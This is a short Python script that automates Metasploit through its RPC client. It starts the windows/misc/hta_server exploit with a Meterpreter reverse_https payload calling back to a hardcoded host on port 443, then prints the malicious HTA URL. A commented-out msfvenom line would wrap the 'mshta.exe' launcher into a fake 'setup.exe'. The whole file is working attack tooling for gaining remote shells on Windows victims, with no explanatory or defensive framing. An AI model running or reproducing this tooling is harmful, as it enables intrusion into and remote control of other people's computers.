from library.pymetasploit3.msfrpc import MsfRpcClient
import subprocess

def init(client):
    holy=''
    URL=''
    htaserver = client.modules.use('exploit','windows/misc/hta_server')
    htaserver['SRVHOST']='172.168.103.160'
    spl = client.modules.use('payload','windows/meterpreter/reverse_https')
    spl['LHOST'] = '172.168.103.160'
    spl['LPORT'] = '443'
    print("[*] Setting up hta server..")
    cid = client.consoles.console().cid
    output = (client.consoles.console(cid).run_server_with_output(htaserver, payload=spl).split('['))
    x=1
    while x < len(output): 
        if "URL:" in output[x]:
            snippet=output[x]
            holy = snippet.split('URL: ')
        x+=1
    if(len(holy)>1):
        URL = holy[1]
    else:
        URL = "nothing, an error has occured.. is there a server using port {}??".format(htaserver['SRVPORT'])
    print("[+] Payload URL is {}".format(URL))
    return(URL)
    #convert payload into exe
    #print("Converting into exe.")
    #subprocess.call("msfvenom -p windows/exec cmd='mshta.exe {}' -f exe > setup.exe".format(URL),shell=True)


if __name__ == '__main__':
    client = MsfRpcClient('123',port=55552)
    start=init(client)


